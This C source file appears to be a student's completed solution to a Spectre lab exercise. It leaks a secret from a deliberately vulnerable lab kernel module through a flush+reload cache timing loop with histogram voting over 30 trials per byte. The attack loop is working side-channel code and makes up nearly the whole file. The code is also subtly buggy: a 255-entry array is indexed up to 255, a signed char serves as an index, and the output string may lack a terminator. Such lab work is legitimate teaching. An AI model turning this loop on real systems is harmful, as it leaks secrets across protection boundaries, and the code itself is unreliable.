/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

void clean_shared_memory_from_tlb(char *shared_memory) {
    for (size_t i = 0; i < 256; i++)
    {
        clflush(shared_memory + (4096*i));
    }
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        int hist[255] = {0};
        for (int j = 0; j < 30; j++) {
            char leaked_byte;
            int min = 100000;
            clean_shared_memory_from_tlb(shared_memory);
            call_kernel_part1(kernel_fd, shared_memory, current_offset);
            int tmp;
            for (int i = 0; i < 256; i++) {
                tmp = time_access(shared_memory + (4096 * i));
                if (tmp < min) {
                    min = tmp;
                    leaked_byte = i;
                }

            }
            hist[leaked_byte]++;
        
            // [Part 1]- Fill this in!
            // Feel free to create helper methods as necessary.
            // Use "call_kernel_part1" to interact with the kernel module
            // Find the value of leaked_byte for offset "current_offset"
            // leaked_byte = ??
        }
        int max = 0;
        for (int i = 0; i < 256; i++) {
            if (hist[max] < hist[i]) {
                max = i;
            }
        }
        leaked_str[current_offset] = max;
        if (max == '\x00') {
            break;
        }
    }
    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
